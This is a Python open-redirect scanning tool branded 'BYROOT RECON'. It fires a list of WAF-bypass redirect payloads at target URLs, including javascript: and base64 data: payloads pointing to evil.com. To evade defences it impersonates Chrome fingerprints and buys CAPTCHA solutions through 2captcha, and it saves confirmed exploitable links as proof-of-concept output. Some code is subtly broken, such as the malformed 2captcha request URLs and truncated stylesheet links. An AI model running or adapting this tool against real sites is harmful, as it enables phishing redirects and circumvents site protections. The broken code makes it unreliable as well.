#!/usr/bin/env python3
import subprocess
import re
import sys
import os
import time
import json
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from datetime import datetime
from ftplib import FTP
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

# ==========================================
# 1. SETTINGS AND CONFIGURATION
# ==========================================
SCOPE_FILE = "urltopkapsam.txt"
REPORT_FOLDER = "rapor"
CHECKPOINT_FILE = "checkpoint.json"
POC_OUTPUT_FILE = "vulnerable_links.txt"

# --- BRAND SOCIAL MEDIA LINKS ---
YOUTUBE_LINK = "https://www.youtube.com/@byroot3254"
TELEGRAM_LINK = "https://t.me/joinchat/9eh5ZhOTez44MjU0"
DISCORD_LINK = "https://discord.com/invite/PP5UYBW"

# --- BIG ASCII LOGO & BANNER ---
BANNER_LOGO = """
\033[96m██████╗ ██╗   ██╗██████╗  ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
██████╔╝ ╚████╔╝ ██████╔╝██║   ██║██║   ██║   ██║   
██╔══██╗  ╚██╔╝  ██╔══██╗██║   ██║██║   ██║   ██║   
██████╔╝   ██║   ██║  ██║╚██████╔╝╚██████╔╝   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝\033[0m
\033[95m==================================================
           AUTOMATED OPEN REDIRECT SCANNER
==================================================\033[0m"""

# --- AI-POWERED ANTI-CAPTCHA BYPASS ROOM ---
API_KEY_2CAPTCHA = "BURAYA_2CAPTCHA_API_KEYINIZI_YAZIN"
CAPTCHA_BYPASS_ACTIVE = True

# --- FTP SERVER DETAILS ---
FTP_ACTIVE = False
FTP_HOST = "192.168.1.4"
FTP_USER = "root"
FTP_PASS = "**********"
FTP_PORT = False
FTP_DIR = "komodor/openredirect"

# --- CRITICAL OPEN REDIRECT KEYWORDS ---
OR_KEYWORDS = "url|redirect|redir|return|next|forward|dest|destination|to|out|go|goto|callback|checkout|login|logout|signout|success|image|file|source|src|view|returnurl"

# --- STEALTH PATH-BASED KEYWORDS ---
PATH_KEYWORDS = "redirect|/go/|/return/|/forward/|/logout/|/login/next"

# --- WAF BYPASS PAYLOADS ---
BASE_PAYLOADS = [
    "//yandex.com", "///yandex.com", "https://yandex.com", "http://yandex.com",
    "%%30%30yandex.com", "/\\/\\yandex.com", "//\\yandex.com", "/\\\\yandex.com", 
    ".\\\\yandex.com", "/.yandex.com", "/https://yandex.com", "/https:yandex.com",
    "//://yandex.com", "//yandex.com%2f", "//yandex.com%2f%2f", "//yandex.com?", "//yandex.com#",
    "https://target.com%2f%2f@yandex.com", "https://target.com%1f@yandex.com",
    "https://target.com%00@yandex.com", "https://target.com\\.yandex.com", "https://yandex.com#.target.com",
    "https://yandex.com?.target.com", "https://://://target.com", "https://target.com%://yandex.com",
    "https:／／yandex.com", "https:＼＼yandex.com", "http:／／yandex.com", "http:＼＼yandex.com",
    "//┦yandex.com", "//%c0%af%c0%afyandex.com", "/%2f%2fyandex.com", "%2f%2fyandex.com", "%5c%5cyandex.com",
    "javascript:window.location='https://yandex.com'", "javascript:window.location=atob('aHR0cHM6Ly9ldmlsLmNvbQ==')",
    "data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+",
    "/\\/\\/yandex.com", "\\\\yandex.com", "\\/\\/yandex.com"
]

ALL_VULNERABILITIES = []
WAF_BLOCK_COUNTER = 0
SCAN_STOPPED = False
# ==========================================
# 2. HELPER FUNCTIONS & RESUME ENGINE
# ==========================================
def read_file(file_path):
    if not os.path.exists(file_path):
        print(f"[-] Error: {file_path} not found!")
        sys.exit(1)
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def get_url_domain(url):
    try:
        url_str = url if isinstance(url, list) else str(url)
        url_str = url_str.strip().strip("[]'\" ")
        if not url_str.startswith("http://") and not url_str.startswith("https://"):
            url_str = f"http://{url_str}"
        parsed = urlparse(url_str)
        domain = parsed.netloc
        if ":" in domain:
            domain = domain.split(":")
        return domain if domain else "unknown-domain"
    except Exception:
        return "unknown-domain"

def get_dynamic_report_name():
    urls = read_file(SCOPE_FILE)
    if urls:
        net_domain = get_url_domain(urls[0]) # Listenin ilk elemanından domaini çeker
        return f"{net_domain}-byroot.html"
    return "example-byroot.html"

def save_checkpoint(step_name, last_index, found_vulns):
    data = {"step": step_name, "last_index": last_index, "vulnerabilities": found_vulns}
    with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                print("\033[93m[!] An interrupted scan session was detected! Resuming from the last checkpoint...\033[0m")
                return json.load(f)
        except Exception:
            return None
    return None

def save_poc_link(poc_url):
    try:
        with open(POC_OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(poc_url + "\n")
    except Exception: pass

def upload_ftp_report(local_file_path, report_name):
    if not FTP_ACTIVE:
        return
    print(f"[*] Uploading report to FTP Server ({FTP_HOST})...")
    try:
        ftp = FTP()
        ftp.connect(FTP_HOST, timeout=10)
        ftp.login(FTP_USER, FTP_PASS)
        try: ftp.cwd(FTP_DIR)
        except Exception:
            for folder in FTP_DIR.split('/'):
                if folder:
                    try: ftp.cwd(folder)
                    except Exception: ftp.mkd(folder); ftp.cwd(folder)
        with open(local_file_path, "rb") as f:
            ftp.storbinary(f"STOR {report_name}", f)
        ftp.quit()
        print(f"\033[92m[+] Success! Server Location: ftp://{FTP_HOST}/{FTP_DIR}/{report_name}\033[0m")
    except Exception as e:
        print(f"\033[91m[-] FTP Upload Error: {str(e)}\033[0m")
def write_recon_geniuses_html_report(vulnerability_list):
    date_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_name = get_dynamic_report_name()
    if not os.path.exists(REPORT_FOLDER):
        os.makedirs(REPORT_FOLDER)
    local_report_path = os.path.join(REPORT_FOLDER, report_name)

    table_rows = ""
    for idx, (v_url, v_payload, v_target) in enumerate(vulnerability_list, 1):
        target_domain = get_url_domain(v_url)
        real_poc_url = v_url.replace("FUZZ", v_payload) if "FUZZ" in v_url else f"{v_url}{v_payload}"
        if "FUZZ" not in v_url and "=" not in v_url:
            real_poc_url = f"{v_url}/{v_payload}".replace("//", "/") if v_url.endswith("/") else f"{v_url}/{v_payload}"

        try:
            v_target_clean = str(v_target).encode('utf-8', 'ignore').decode('utf-8')
            v_payload_clean = str(v_payload).encode('utf-8', 'ignore').decode('utf-8')
        except Exception:
            v_target_clean = str(v_target)
            v_payload_clean = str(v_payload)

        table_rows += f"""
        <tr>
            <td><span class="badge-index">{idx}</span></td>
            <td><span class="text-neon-cyan fw-bold">{target_domain}</span></td>
            <td class="text-break"><code>{real_poc_url}</code></td>
            <td class="text-break">
                <span class="text-white fw-bold">| --&gt; |</span> 
                <span class="text-neon-green">{v_target_clean}</span> 
                <span class="badge bg-danger ms-2" style="font-family: monospace;">Payload: {v_payload_clean}</span>
            </td>
        </tr>
        """

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>BYROOT RECON - Open Redirect Report</title>
    <link href="https://jsdelivr.net" rel="stylesheet">
    <link href="https://cloudflare.com" rel="stylesheet">
    <style>
        body {{ background-color: #080c10; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; }}
        .recon-header {{ background: linear-gradient(135deg, #161b22 0%, #0d1117 100%); border: 2px solid #00f0ff; box-shadow: 0 0 25px rgba(0, 240, 255, 0.3); border-radius: 12px; }}
        .card-stat {{ background-color: #12161f; border: 1px solid #30363d; border-radius: 8px; }}
        .card-stat:hover {{ border-color: #00f0ff; box-shadow: 0 0 15px rgba(0,240,255,0.2); }}
        .text-neon-green {{ color: #39ff14; text-shadow: 0 0 8px rgba(57,255,20,0.5); }}
        .text-neon-cyan {{ color: #00f0ff; text-shadow: 0 0 8px rgba(0,240,255,0.5); }}
        .badge-index {{ background-color: #21262d; color: #8b949e; padding: 6px 12px; border-radius: 4px; border: 1px solid #30363d; font-weight: bold; }}
        .table {{ color: #c9d1d9; border-color: #30363d; }}
        thead th {{ color: #58a6ff !important; font-size: 1.1rem; }}
        code {{ color: #ff7b72; background-color: #1f242c; padding: 4px 8px; border-radius: 4px; font-size: 0.95rem; }}
        .social-container {{ background: #12161f; border: 1px solid #21262d; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }}
        .social-btn {{ font-size: 1.25rem; font-weight: bold; padding: 14px 30px; border-radius: 10px; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }}
        .social-btn:hover {{ transform: translateY(-3px); box-shadow: 0 0 25px currentColor; }}
    </style>
</head>
<body>
    <div class="container my-5">
        <!-- Brand Social Media Banner (Massive & Distinct) -->
        <div class="social-container text-center mb-5">
            <h4 class="text-white fw-bold mb-3" style="letter-spacing: 2px;">⚡ OFFICIAL BRAND COMMUNITIES ⚡</h4>
            <div class="d-flex justify-content-center gap-4 flex-wrap">
                <a href="{YOUTUBE_LINK}" target="_blank" class="btn text-danger social-btn" style="background-color: #1a0f12; border: 2px solid #ff0022;">
                    <i class="fab fa-youtube fa-xl me-2"></i>YouTube Channel
                </a>
                <a href="{TELEGRAM_LINK}" target="_blank" class="btn text-info social-btn" style="background-color: #0f172a; border: 2px solid #0088cc;">
                    <i class="fab fa-telegram fa-xl me-2"></i>Telegram Group
                </a>
                <a href="{DISCORD_LINK}" target="_blank" class="btn social-btn" style="background-color: #131428; border: 2px solid #5865F2; color: #5865F2;">
                    <i class="fab fa-discord fa-xl me-2"></i>Discord Server
                </a>
            </div>
        </div>

        <div class="recon-header p-5 mb-5 text-center">
            <h1 class="display-3 fw-bold text-neon-cyan" style="letter-spacing: 3px;">🧬 BYROOT RECON</h1>
            <p class="lead text-white-50 mt-2 fs-4">Automated High-Performance Open Redirect Core System</p>
        </div>
        <div class="row mb-5">
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">SCAN TIME</span><h4 class="fw-bold mt-2 text-white">{date_str}</h4></div></div>
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">MAIN TARGET TARGET</span><h4 class="fw-bold mt-2 text-neon-cyan">{get_url_domain(read_file(SCOPE_FILE))}</h4></div></div>
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">LIVE VULNERABILITIES</span><h4 class="fw-bold mt-2 text-neon-green">{len(vulnerability_list)} Confirmed</h4></div></div>
        </div>
        <div class="card-stat p-4">
            <h3 class="fw-bold mb-4 text-white">🎯 Consolidated Vulnerability Log</h3>
            <div class="table-responsive">
                <table class="table align-middle mb-0">
                    <thead><tr><th>#</th><th>Target Host</th><th>Vulnerable URL</th><th>Confirmed Redirect Destination</th></tr></thead>
                    <tbody>{table_rows}</tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>"""
    with open(local_report_path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(html_content)
    print(f"\n\033[96m[+] RECON GENIUSES Report Saved to Folder: {local_report_path}\033[0m")
    upload_ftp_report(local_report_path, report_name)
def solve_ai_captcha(site_url):
    if not CAPTCHA_BYPASS_ACTIVE or API_KEY_2CAPTCHA == "BURAYA_2CAPTCHA_API_KEYINIZI_YAZIN":
        return None
    print(f"\n\033[95m[!] ANTI-CAPTCHA BYPASS ROOM: AI token resolution process started -> {site_url}\033[0m")
    try:
        in_res = requests.post(f"http://2captcha.com{API_KEY_2CAPTCHA}&method=userrecaptcha&googlekey=6Lcj-R8TAAAAAB_VJXYw3S2Z61BFbLe63_9S1V0k&pageurl={site_url}", timeout=10)
        if "OK|" in in_res.text:
            captcha_id = in_res.text.split("|")[-1]
            for _ in range(20):
                time.sleep(3)
                out_res = requests.get(f"http://2captcha.com{API_KEY_2CAPTCHA}&action=get&id={captcha_id}", timeout=10)
                if "OK|" in out_res.text:
                    print("\033[92m[+] ANTI-CAPTCHA BYPASS ROOM: AI bypassed the barrier! Token acquired.\033[0m\n")
                    return out_res.text.split("|")[-1]
        return None
    except Exception: return None

# ==========================================
# 3. SCAN ENGINE & CORE LOGIC
# ==========================================
def clean_with_uro(url_list):
    fuzzed_endpoints = []
    for raw_url in url_list:
        url = raw_url
        if not url.startswith("http://") and not url.startswith("https://"): url = f"http://{url}"
        if "=" not in url: fuzzed_endpoints.append(url); continue
        try:
            if "FUZZ" in url: fuzzed_endpoints.append(url); continue
            parsed_url = urlparse(url)
            query_params = parse_qsl(parsed_url.query, keep_blank_values=True)
            if not query_params:
                fuzzed_endpoints.append(f"{url}FUZZ" if url.endswith("=") else url)
                continue
            for i in range(len(query_params)):
                temp_params = [(k, "FUZZ" if idx == i else v) for idx, (k, v) in enumerate(query_params)]
                fuzzed_endpoints.append(urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(temp_params), parsed_url.fragment)))
        except Exception: fuzzed_endpoints.append(url)
    with open("or_temp_raw.txt", "w") as f: f.write("\n".join(fuzzed_endpoints))
    try:
        result = subprocess.run(["uro", "-i", "or_temp_raw.txt"], capture_output=True, text=True, check=True)
        clean_list = [line.strip() for line in result.stdout.split("\n") if line.strip()]
    except Exception: clean_list = list(set(fuzzed_endpoints))
    finally:
        if os.path.exists("or_temp_raw.txt"): os.remove("or_temp_raw.txt")
    return clean_list
def generate_dynamic_payloads(url, payload_list):
    domain = get_url_domain(url)
    if "=" not in url:
        return [f"/{p.lstrip('/')}".replace("target.com", domain) for p in payload_list]
    return [p.replace("target.com", domain) for p in payload_list]

def send_single_request(args):
    global WAF_BLOCK_COUNTER, SCAN_STOPPED
    if SCAN_STOPPED: return
    main_url, payload, step_name, idx = args
    current_domain = get_url_domain(main_url)
    test_url = main_url.replace("FUZZ", payload) if "FUZZ" in main_url else f"{main_url}/{payload.lstrip('/')}"

    try:
        imprint_browser = None if ("192.168." in current_domain or "127.0.0." in current_domain or "localhost" in current_domain) else "chrome"
        timeout_duration = 6 if step_name == "step1" else 4
        response = requests.get(test_url, impersonate=imprint_browser, allow_redirects=False, verify=False, timeout=timeout_duration)
        
        if response.status_code in {403, 429, 503} or "captcha" in response.text.lower() or "cloudflare" in response.text.lower():
            WAF_BLOCK_COUNTER += 1
            if WAF_BLOCK_COUNTER >= 5:
                print(f"\n\033[91m[!] WARNING: WAF block/Captcha detected {WAF_BLOCK_COUNTER} times consecutively!\033[0m")
                if solve_ai_captcha(test_url): WAF_BLOCK_COUNTER = 0
                else:
                    print("\033[1;31m[WAF BLOCK CONFIRMED] SCAN STOPPED to prevent IP blacklisting!\033[0m\n")
                    SCAN_STOPPED = True; return
        else:
            if WAF_BLOCK_COUNTER > 0: WAF_BLOCK_COUNTER -= 1

        if response.status_code in {301, 302, 303, 307, 308}:
            location_header = response.headers.get("Location", "")
            if location_header:
                valid_vulnerability = False
                if location_header.startswith("javascript:") or location_header.startswith("data:"): valid_vulnerability = True
                elif location_header.startswith("http://yandex.com") or location_header.startswith("https://yandex.com") or location_header.startswith("//yandex.com") or location_header.startswith("///yandex.com"): valid_vulnerability = True
                elif "yandex.com" in location_header and not (location_header.startswith("http://" + current_domain) or location_header.startswith("https://" + current_domain)): valid_vulnerability = True

                if valid_vulnerability:
                    clean_screen_destination = location_header.split("FUZZ")[-1]
                    clean_screen_destination = f"https://yandex.com{clean_screen_destination}" if "FUZZ" in location_header else location_header
                    print(f"\n\033[91m{'='*80}\033[92m\n[+] LIVE VULNERABILITY DETECTED [JA4 CHROME ENGINE]\n\033[94m[-] Target Host    : {current_domain}\n[-] Vulnerable URL : {test_url}\n[-] Destination    : | --> | \033[1;32m{clean_screen_destination} \033[1;33m[Payload: {payload}]\n\033[91m{'='*80}\033[0m\n")
                    ALL_VULNERABILITIES.append((main_url, payload, clean_screen_destination))
                    save_poc_link(test_url)
    except Exception: pass
def fire_scan_engine(url_list, step_name, start_index=0):
    if not url_list or SCAN_STOPPED: return
    max_threads, request_delay = 20, 0.04
    request_queue = []
    for i, main_url in enumerate(url_list):
        for payload in generate_dynamic_payloads(main_url, BASE_PAYLOADS): request_queue.append((main_url, payload, step_name, i))
    request_queue = request_queue[start_index:]
    
    current_domain = get_url_domain(url_list)
    lbl = f"\033[91m[JA4 INACTIVE]\033[0m (Local Network)" if ("192.168." in current_domain or "localhost" in current_domain) else f"\033[92m[JA4 DESKTOP CHROME ENGINE ACTIVE]\033[0m (20 RPS)"
    print(f"[*] Target: {current_domain} -> {lbl}")

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for args in request_queue:
            if SCAN_STOPPED: break
            executor.submit(send_single_request, args); time.sleep(request_delay)

def main():
    global ALL_VULNERABILITIES
    if os.path.exists(POC_OUTPUT_FILE): os.remove(POC_OUTPUT_FILE)
    
    # Massive Visual Welcome Engine
    print(BANNER_LOGO)
    print(f"\033[1;31m[BYROOT OFFICIAL LINKS]\033[0m")
    print(f" 📺 \033[91mYouTube\033[0m  : {YOUTUBE_LINK}")
    print(f" 🚀 \033[94mTelegram\033[0m : {TELEGRAM_LINK}")
    print(f" 👾 \033[95mDiscord\033[0m  : {DISCORD_LINK}")
    print("\033[95m==================================================\033[0m\n")

    total_url_pool = read_file(SCOPE_FILE)
    pattern = rf"[?&]({OR_KEYWORDS})=|=http|=www\.|({PATH_KEYWORDS})"
    
    saved_session = load_checkpoint()
    active_step, start_idx = "step1", 0
    if saved_session:
        active_step, start_idx = saved_session.get("step", "step1"), saved_session.get("last_index", 0)
        ALL_VULNERABILITIES = saved_session.get("vulnerabilities", [])

    print("\n\033[93m[*] STEP 1: Scanning critical parametric and stealth path-based URLs...\033[0m")
    step1_raw = [url for url in total_url_pool if re.search(pattern, url, re.IGNORECASE)]
    if step1_raw and active_step == "step1" and not SCAN_STOPPED:
        fire_scan_engine(clean_with_uro(step1_raw), "step1", start_idx)
        start_idx, active_step = 0, "step2"

    print("\n\033[93m[*] STEP 2: Scanning all remaining standard URLs...\033[0m")
    step2_raw = [url for url in total_url_pool if url not in step1_raw]
    if step2_raw and active_step == "step2" and not SCAN_STOPPED:
        fire_scan_engine(clean_with_uro(step2_raw), "step2", start_idx)

    print("\n\033[94m[*] All scans completed. Processing results...\033[0m")
    if ALL_VULNERABILITIES: write_recon_geniuses_html_report(ALL_VULNERABILITIES)
    else: print("\033[91m[-] No live vulnerabilities found; report was not generated.\033[0m")

if __name__ == "__main__":
    main()
